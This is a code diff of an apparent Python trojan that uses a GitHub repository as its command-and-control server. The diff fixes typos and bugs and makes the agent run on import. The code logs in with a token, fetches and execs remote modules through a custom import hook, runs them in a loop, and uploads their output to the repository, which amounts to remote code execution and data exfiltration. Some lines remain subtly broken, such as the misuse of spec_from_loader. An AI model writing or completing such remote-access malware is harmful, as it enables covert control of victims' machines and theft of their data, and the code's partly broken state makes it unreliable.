@@ -14,7 +14,7 @@ def github_connect():
         token = f.read()
     user = 'Mike-The-Konops-Lord'
     sess = github3.login(token=token)
-    return sess.repository(user, 'Konopzzzz')
+    return sess.repository(user, 'KonopsTest')
 
 def get_file_contents(dirname, module_name, repo):
     return repo.file_contents(f'{dirname}/{module_name}').content
@@ -27,13 +27,13 @@ class Mosquito:
         self.repo = github_connect()
     
     def get_config(self):
-        config_json = get_file_contents('config', self.config_filem, self.repo)
+        config_json = get_file_contents('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
 
         for task in config:
             if task['module'] not in sys.modules:
                 exec("import %s" % task['module'])
-            return config
+        return config
 
     def module_runner(self, module):
         result = sys.modules[module].run()
@@ -43,7 +43,7 @@ class Mosquito:
         message = datetime.now().isoformat()
         remote_path = f'data/{self.id}/{message}.data'
         bindata = bytes('%r' % data, 'utf-8')
-        self.repo.create_file(remote_path, message, bease64.b64encode(bindata))
+        self.repo.create_file(remote_path, message, base64.b64encode(bindata))
 
     def run(self):
         while True:
@@ -70,14 +70,14 @@ class GitImporter:
             return self
     
     def load_module(self, name):
-        spec = importlib.util.spec_from_loader(name,
-            loader = None, origin=self.repo.git_url)
-        new_module= importlib.util.spec_from_loader(spec)
+        spec = importlib.util.spec_from_loader(name, loader = None, origin=self.repo.git_url)
+        
+        new_module = importlib.util.spec_from_loader(spec, spec.loader)
         exec(self.current_module_code, new_module.__dict__)
         sys.modules[spec.name] = new_module
         return new_module
 
-if __name__ == 'main':
-    sys.meta_path.append(GitImporter())
-    mosquito = Mosquito('MS1')
-    mosquito.run()
+
+sys.meta_path.append(GitImporter())
+mosquito = Mosquito('msid_0')
+mosquito.run()
